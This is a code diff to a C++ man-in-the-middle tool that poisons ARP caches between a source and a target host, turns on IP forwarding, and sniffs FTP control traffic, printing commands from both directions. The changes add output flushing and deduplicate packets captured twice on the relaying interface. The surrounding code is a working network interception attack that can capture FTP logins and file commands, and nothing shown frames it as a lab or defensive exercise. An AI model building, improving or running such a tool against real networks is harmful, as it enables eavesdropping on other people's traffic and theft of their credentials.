@@ -124,7 +124,7 @@ static void poisonLoop() {
     int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
     if (sock < 0) { perror("socket AF_PACKET (poison)"); return; }
 
-    std::cout << "[*] ARP poisoning running — CTRL+C to stop\n";
+    std::cout << "[*] ARP poisoning running — CTRL+C to stop\n" << std::flush;
 
     while (g_running) {
         // Tell src:    "targetIP is at g_ownMac"  (we impersonate target)
@@ -190,6 +190,19 @@ static void packetHandler(u_char * /*user*/,
     inet_ntop(AF_INET, ip + 12, srcIp, sizeof(srcIp));
     inet_ntop(AF_INET, ip + 16, dstIp, sizeof(dstIp));
 
+    // Deduplicate: packets are captured twice on the MITM interface
+    // (once arriving, once after IP-forwarding). Track by TCP seq number
+    // combined with src/dst ports so retransmissions on different flows
+    // are not incorrectly suppressed.
+    uint32_t seq = static_cast<uint32_t>((tcp[4] << 24) | (tcp[5] << 16) |
+                                         (tcp[6] << 8)  |  tcp[7]);
+    uint64_t key = (static_cast<uint64_t>(srcPort) << 48) |
+                   (static_cast<uint64_t>(dstPort) << 32) |
+                   seq;
+    static std::unordered_set<uint64_t> seen;
+    if (!seen.insert(key).second) return; // already processed
+    if (seen.size() > 4096) seen.clear(); // bound memory
+
     // Strip trailing CR/LF
     while (!data.empty() && (data.back() == '\r' || data.back() == '\n'))
         data.pop_back();
@@ -199,7 +212,7 @@ static void packetHandler(u_char * /*user*/,
         // Show all FTP control traffic in both directions
         std::cout << "[FTP] " << srcIp << ":" << srcPort
                   << " -> " << dstIp << ":" << dstPort
-                  << "  |  " << data << "\n";
+                  << "  |  " << data << "\n" << std::flush;
     } else {
         // Show only file-relevant commands (client → server)
         if (dstPort != 21) return;
@@ -210,7 +223,7 @@ static void packetHandler(u_char * /*user*/,
             if (data.size() >= cmd.size() &&
                 data.compare(0, cmd.size(), cmd) == 0) {
                 std::cout << "[FTP] " << srcIp << " -> " << dstIp
-                          << "  |  " << data << "\n";
+                          << "  |  " << data << "\n" << std::flush;
                 break;
             }
         }
@@ -283,6 +296,7 @@ int main(int argc, char *argv[]) {
               << "[*] Target    : " << g_ipTarget  << "  " << g_macTarget  << "\n";
     if (g_verbose)
         std::cout << "[*] Verbose   : ON\n";
+    std::cout << std::flush;
 
     // Enable IP forwarding so we actually relay traffic
     {
@@ -319,7 +333,7 @@ int main(int argc, char *argv[]) {
     }
 
     std::cout << "[*] Sniffing FTP traffic between "
-              << g_ipSrc << " and " << g_ipTarget << "...\n";
+              << g_ipSrc << " and " << g_ipTarget << "...\n" << std::flush;
 
     // Blocking capture loop — exits via pcap_breakloop() on SIGINT
     pcap_loop(g_handle, 0, packetHandler, nullptr);
